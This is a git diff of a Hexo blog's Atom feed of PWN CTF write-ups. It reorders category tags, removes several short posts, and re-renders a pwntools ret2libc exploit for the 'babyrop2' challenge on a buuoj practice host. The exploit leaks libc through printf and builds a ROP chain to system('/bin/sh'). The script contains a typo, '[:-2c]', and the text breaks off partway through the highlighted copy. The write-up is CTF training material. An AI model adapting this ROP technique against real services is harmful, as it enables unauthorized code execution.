@@ -3,19 +3,9 @@
     <id>http://waltcsz.github.io</id>
     <title>Walt&#39;s Blog</title>
     <link href="http://waltcsz.github.io" />
-    <updated>2023-10-28T12:46:00.000Z</updated>
-    <category term="heap" />
-    <category term="汇编" />
-    <category term="寄存器" />
-    <category term="工具" />
+    <updated>2023-10-23T06:07:01.000Z</updated>
     <category term="stack migration" />
-    <category term="新生题" />
-    <category term="short shellcode" />
-    <category term="random" />
-    <category term="cdll" />
-    <category term="侧信道攻击" />
-    <category term="时间差" />
-    <category term="full RELRO" />
+    <category term="heap" />
     <category term="double free" />
     <category term="fastbin attack" />
     <category term="chunk_extend_and_overlapping" />
@@ -23,25 +13,16 @@
     <category term="tcache" />
     <category term="malloc_hook" />
     <category term="free_hook" />
-    <entry>
-        <id>http://waltcsz.github.io/uncategorized/test-11e775c4f565/</id>
-        <title>test</title>
-        <link rel="alternate" href="http://waltcsz.github.io/uncategorized/test-11e775c4f565/"/>
-        <content type="html">&lt;h1 id=&#34;jskdfjksl&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#jskdfjksl&#34;&gt;#&lt;/a&gt; jskdfjksl&lt;/h1&gt;
-</content>
-        <updated>2023-10-28T12:46:00.000Z</updated>
-    </entry>
-    <entry>
-        <id>http://waltcsz.github.io/PWN/Write-Up/0xgame-17fb555c424b/</id>
-        <title>0xgame</title>
-        <link rel="alternate" href="http://waltcsz.github.io/PWN/Write-Up/0xgame-17fb555c424b/"/>
-        <content type="html">&lt;h1 id=&#34;0xgame&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#0xgame&#34;&gt;#&lt;/a&gt; 0xgame&lt;/h1&gt;
-&lt;h2 id=&#34;ret2libc-revenge&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ret2libc-revenge&#34;&gt;#&lt;/a&gt; ret2libc-revenge&lt;/h2&gt;
-&lt;p&gt;&lt;img data-src=&#34;image-20231026200944097.png&#34; alt=&#34;image-20231026200944097&#34;&gt;&lt;/p&gt;
-&lt;p&gt;禁用了 execve。&lt;/p&gt;
-</content>
-        <updated>2023-10-26T11:10:48.000Z</updated>
-    </entry>
+    <category term="新生题" />
+    <category term="short shellcode" />
+    <category term="random" />
+    <category term="cdll" />
+    <category term="侧信道攻击" />
+    <category term="时间差" />
+    <category term="full RELRO" />
+    <category term="工具" />
+    <category term="汇编" />
+    <category term="寄存器" />
     <entry>
         <id>http://waltcsz.github.io/PWN/Write-Up/newstarctf2023-week5-bf2485f15add/</id>
         <title>newstarctf2023 week5</title>
@@ -215,23 +196,6 @@
         <updated>2023-10-19T17:20:21.000Z</updated>
     </entry>
     <entry>
-        <id>http://waltcsz.github.io/uncategorized/hello-world-dd9c95e64fec/</id>
-        <title>Hello World</title>
-        <link rel="alternate" href="http://waltcsz.github.io/uncategorized/hello-world-dd9c95e64fec/"/>
-        <content type="html">&lt;p&gt;Welcome to &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9oZXhvLmlvLw==&#34;&gt;Hexo&lt;/span&gt;! This is your very first post. Check &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9oZXhvLmlvL2RvY3Mv&#34;&gt;documentation&lt;/span&gt; for more info. If you get any problems when using Hexo, you can find the answer in &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9oZXhvLmlvL2RvY3MvdHJvdWJsZXNob290aW5nLmh0bWw=&#34;&gt;troubleshooting&lt;/span&gt; or you can ask me on &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2hleG9qcy9oZXhvL2lzc3Vlcw==&#34;&gt;GitHub&lt;/span&gt;.&lt;/p&gt;
-&lt;h2 id=&#34;quick-start&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#quick-start&#34;&gt;#&lt;/a&gt; Quick Start&lt;/h2&gt;
-&lt;h3 id=&#34;create-a-new-post&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#create-a-new-post&#34;&gt;#&lt;/a&gt; Create a new post&lt;/h3&gt;
-&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;span&gt;h&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;$ hexo new &lt;span class=&#34;token string&#34;&gt;&#34;My New Post&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;More info: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvd3JpdGluZy5odG1s&#34;&gt;Writing&lt;/span&gt;&lt;/p&gt;
-&lt;h3 id=&#34;run-server&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#run-server&#34;&gt;#&lt;/a&gt; Run server&lt;/h3&gt;
-&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;span&gt;h&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;$ hexo server&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;More info: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvc2VydmVyLmh0bWw=&#34;&gt;Server&lt;/span&gt;&lt;/p&gt;
-&lt;h3 id=&#34;generate-static-files&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#generate-static-files&#34;&gt;#&lt;/a&gt; Generate static files&lt;/h3&gt;
-&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;span&gt;h&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;$ hexo generate&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;More info: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9oZXhvLmlvL2RvY3MvZ2VuZXJhdGluZy5odG1s&#34;&gt;Generating&lt;/span&gt;&lt;/p&gt;
-&lt;h3 id=&#34;deploy-to-remote-sites&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#deploy-to-remote-sites&#34;&gt;#&lt;/a&gt; Deploy to remote sites&lt;/h3&gt;
-&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;span&gt;h&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;$ hexo deploy&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;More info: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvb25lLWNvbW1hbmQtZGVwbG95bWVudC5odG1s&#34;&gt;Deployment&lt;/span&gt;&lt;/p&gt;
-</content>
-        <updated>2023-10-19T15:21:16.516Z</updated>
-    </entry>
-    <entry>
         <id>http://waltcsz.github.io/PWN/Write-Up/buu-0910-99351e39558a/</id>
         <title>buu 0910</title>
         <link rel="alternate" href="http://waltcsz.github.io/PWN/Write-Up/buu-0910-99351e39558a/"/>
@@ -365,8 +329,8 @@ int 0x80;
 &lt;p&gt;这个程序迁移回 32 位就简单多了。&lt;/p&gt;
 &lt;h2 id=&#34;hitcontraining_magicheap&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#hitcontraining_magicheap&#34;&gt;#&lt;/a&gt; hitcontraining_magicheap&lt;/h2&gt;
 </content>
-        <category term="heap" />
         <category term="stack migration" />
+        <category term="heap" />
         <updated>2023-09-11T09:12:49.000Z</updated>
     </entry>
     <entry>
@@ -450,14 +414,6 @@ int 0x80;
         <updated>2023-09-07T10:37:22.824Z</updated>
     </entry>
     <entry>
-        <id>http://waltcsz.github.io/PWN/Write-Up/wmctf-2023-999eec3718f5/</id>
-        <title>wmctf 2023</title>
-        <link rel="alternate" href="http://waltcsz.github.io/PWN/Write-Up/wmctf-2023-999eec3718f5/"/>
-        <content type="html">&lt;h2 id=&#34;blindless&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#blindless&#34;&gt;#&lt;/a&gt; blindless&lt;/h2&gt;
-</content>
-        <updated>2023-09-03T09:52:06.000Z</updated>
-    </entry>
-    <entry>
         <id>http://waltcsz.github.io/PWN/Write-Up/buu-0830-9e04204158ed/</id>
         <title>buu 0830</title>
         <link rel="alternate" href="http://waltcsz.github.io/PWN/Write-Up/buu-0830-9e04204158ed/"/>
@@ -526,53 +482,7 @@ int 0x80;
 &lt;p&gt;这题比较恶心的是 flag 没放在根目录，利用 find -name “flag&amp;quot; 查找文件位置。&lt;/p&gt;
 &lt;p&gt;&lt;img data-src=&#34;./image-20230827010409448.png&#34; alt=&#34;image-20230827010409448&#34;&gt;&lt;/p&gt;
 &lt;p&gt;&lt;img data-src=&#34;./image-20230827010446306.png&#34; alt=&#34;image-20230827010446306&#34;&gt;&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;#!/usr/bin/python3
-from pwn import *
-from LibcSearcher import LibcSearcher
-context(log_level=&#39;debug&#39;)
-
-p=remote(&#39;node4.buuoj.cn&#39;,29945)
-#p=process(&#39;./babyrop2&#39;)
-#gdb.attach(p,&#39;b printf&#39;)
-e = ELF(&#39;./babyrop2&#39;)
-
-printf_p = e.plt[&#39;printf&#39;]
-lsm_g = e.got[&#39;__libc_start_main&#39;]
-puts_g = e.got[&#39;printf&#39;]
-
-offset = 0x020 + 8
-
-main_a = e.sym[&#39;main&#39;]
-exit_a = main_a
-prdi = 0x0400733
-rsi_r15_ret = 0x400731
-ret = 0x04004d1
-src = 0x400770
-def ready():
-    p.recvuntil(b&#39;What\&#39;s your name? &#39;)
-
-ready()
-
-payload = offset * b&#39;a&#39; + p64(prdi)  + p64(src) + p64(rsi_r15_ret) + p64(lsm_g) + p64(0)+p64(printf_p)+ p64(main_a)
-p.sendline(payload)
-p.recvuntil(b&#39;!\nWelcome to the Pwn World again, &#39;)
-lsm_a = u64(p.recvuntil(&#39;!\n&#39;)[:-2c].ljust(8,b&#39;\0&#39;))
-
-print(&#39;the true address of __libc_start_main is %#x&#39;%lsm_a)
-
-
-libc = ELF(&#39;./libc.so.6&#39;)
-libcbase = lsm_a - libc.sym[&#39;__libc_start_main&#39;]
-sys_a = libcbase + libc.sym[&#39;system&#39;]
-bs_a = libcbase + next(libc.search(b&#39;/bin/sh&#39;))
-
-ready()
-payload = offset * b&#39;a&#39; + p64(ret) + p64(prdi) + p64(bs_a) + p64(sys_a) + p64(exit_a)
-p.sendline(payload)
-p.interactive()
-p.close()
-&lt;/code&gt;&lt;/pre&gt;
-</content>
+&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#!/usr/bin/python3&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; LibcSearcher &lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; LibcSearcher&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;context&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;log_level&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;debug&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;p&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;remote&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;node4.buuoj.cn&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;29945&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#p=process(&#39;./babyrop2&#39;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#gdb.attach(p,&#39;b printf&#39;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;e &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; ELF&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;./babyrop2&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;printf_p &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; e&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;plt&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;printf&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;lsm_g &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; e&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;got&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;__libc_start_main&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;puts_g &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; e&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;got&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;printf&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;offset &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0x020&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;8&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;main_a &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; e&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sym&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;main&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;exit_a &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; main_a&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;prdi &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0x0400733&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;rsi_r15_ret &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0x400731&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;ret &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0x04004d1&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;src &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0x400770&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;ready&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;recvuntil&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;b&#39;What\&#39;s your name? &#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;ready&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;28&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;payload &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; offset &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;b&#39;a&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;prdi&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;src&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;rsi_r15_ret&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;lsm_g&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;printf_p&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;main_a&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;29&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sendline&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;payload&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;30&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;recvuntil&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;b&#39;!\nWelcome to the Pwn World again, &#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;31&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;lsm_a &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; u64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;recvuntil&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;!\n&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;2c&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;ljust&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;b&#39;\0&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;32&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;33&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;the true address of __libc_start_main is %#x&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;lsm_a&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;34&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;35&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;36&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;libc &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; ELF&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;./libc.so.6&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;37&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;libcbase &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; lsm_a &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt; libc&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sym&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;__libc_start_main&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;38&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;sys_a &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; libcbase &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; libc&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sym&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;system&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;39&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;bs_a &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; libcbase &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;next&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;libc&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;search&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;b&#39;/bin/sh&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;40&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td 